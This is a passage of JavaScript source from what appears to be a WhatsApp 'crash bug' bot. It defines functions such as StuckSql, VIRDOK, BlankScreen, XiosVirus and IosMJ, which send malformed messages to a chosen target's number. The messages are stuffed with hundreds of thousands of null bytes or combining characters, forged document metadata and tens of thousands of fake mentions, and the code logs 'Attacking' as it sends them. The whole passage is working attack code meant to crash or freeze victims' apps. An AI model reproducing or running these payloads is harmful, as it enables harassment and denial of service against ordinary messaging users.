            participant: "0@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: X,
            conversionSource: " X ",
            conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            conversionDelaySeconds: 10,
            forwardingScore: 9999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: " X "
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "𝐀𝐍𝐓𝐈 𝐌𝐀𝐑𝐆𝐀〽",
              body: "DhikaCrashV6",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "https://www.instagram.com/raditx7",
              mediaUrl: "https://www.instagram.com/raditx7",
              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://www.instagram.com/raditx7"
            },
            groupSubject: " X ",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: " X ",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X "
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      },
      Ptcp ? {
        participant: {
          jid: X
        }
      } : {}
    );
    console.log(chalk.green("KilluaBugs : Attacking"));
  };

  async function sendExtendedTextMessage(jid) {
    dhikaXs.relayMessage(jid, {
      'extendedTextMessage': {
        'text': 'KilluaCrashV6',
        'contextInfo': {
          'stanzaId': jid,
          'participant': jid,
          'quotedMessage': {
            'conversation': 'KilluaCrashV6' + '\0'.repeat(1050000)
          },
          'disappearingMode': {
            'initiator': "CHANGED_IN_CHAT",
            'trigger': "CHAT_SETTING"
          }
        },
        'inviteLinkGroupTypeV2': "DEFAULT"
      }
    }, {
      'participant': {
        'jid': jid
      }
    }, {
      'messageId': null
    });
    console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 sendExtendedTextMessage 𝐁𝐲 ｢ Dhika ｣"));
  }
  
async function StuckSql(X, ThM, Ptcp = true) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: " ༑⌁⃰killuaGG⭑̤ཀ ",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲  ⩟⬦𪲁𝗫𝘀̸̷̷-" + '󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ '.repeat(350000),
								},
								nativeFlowMessage: {},
								contextInfo: {
									mentionedJid: ["243975074423@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "⩟⬦𪲁 𝐊͢𝗶𝐥̰𝐥̰ 𝐮̷𝗮͜𝗫𝘀̸̷̷-",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				}), {
					userJid: X,
					quoted: null
				}
			);
			await dhikaXs.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 StuckSql 𝐁𝐲 ｢ KilluaBugs ｣"));
	};
		
async function newvirpen(target) {
    let virtex = "⩟⬦𪲁 C̷r̷a̷s̷h̷ B̷u̷g̸̷̷-" + "ꦾ".repeat(500000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virtex 
                        }]
                    }
                }
            }
        }
    };

    await dhikaXs.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
    console.log(chalk.red("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 newvirpen 𝐁𝐲 ｢ dhika Bugs ｣"));
  }
  
 async function VIRDOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
					"mimetype": "penis",
					"fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
					"fileLength": "999999999",
					"pageCount": 999999999,
					"mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
					"fileName": `⩟⬦𪲁 𝗗𝗵͢𝗶𝗸̷-\n፝⃟` +  '󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ '.repeat(350000),
					"fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
					"directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
					"mediaKeyTimestamp": "1715880173"
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await dhikaXs.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
			console.log(chalk.green("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 VIRDOK 𝐁𝐲 ｢ dhika Bugs ｣"));
  }
 
      async function ZnX(X, Txt, Amount, Ptcp = true) {
        await dhikaXs.relayMessage(X, {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: Txt,
                    format: "EXTENSIONS_1"
                  },
                  nativeFlowResponseMessage: {
                    name: 'galaxy_message',
                    paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(Amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                    version: 3
                  }
                }
              }
            }
          },
          Ptcp ? {
            participant: {
              jid: X
            }
          } : {}
        );
        console.log(chalk.green("KilkuaBugs : Attacking "));
      };

// Func Tama n Jin
async function FloodsCarousel(target, NullNihBos, Ptcp = true) {
      const header = {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
        },
        hasMediaAttachment: true,
      };

      const body = {
        text: "iOS FC" + "\u0000".repeat(90000),
      };

      const carouselMessage = {
        sections: [
          {
            title: " ϟ ",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
          {
            title: "Section 2",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
        ],
      };

      await dhikaXs.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp ? { participant: { jid: target } } : { quoted: NullNihBos }
      );

      console.log(chalk.blue.bold("Carousel Active : Start Processing Crash!"));
    }

async function BlankScreen(target, Ptcp = false) {
        let virtex = "⚔️ 𝗦𝗬𝗦𝗧𝗘𝗠" + "\u0000".repeat(90000);
			await dhikaXs.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "ZynXzo New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : { quoted: NullNihBos }
			);
       }

async function XiosVirus(target) {
      dhikaXs.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𝐉𝐢𝐧𝐙𝐨 𝐊𝐢𝐥𝐥⃟⃟ -` + "࣯\u0000".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝐉𝐢𝐧𝐙𝐨 𝐊𝐢𝐥𝐥⃟⃟" + "\u0000".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
            quoted: NullNihBos
          },
        },
        {
          messageId: null,
        }
      );
    }

async function IosMJ(target, Ptcp = false) {
      await dhikaXs.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "CALL" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "ZYNXZO - CALL" + "\u0000".repeat(50000),
                body: "𝐉𝐢𝐧𝐙𝐨 𝐊𝐢𝐥𝐥⃟⃟" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
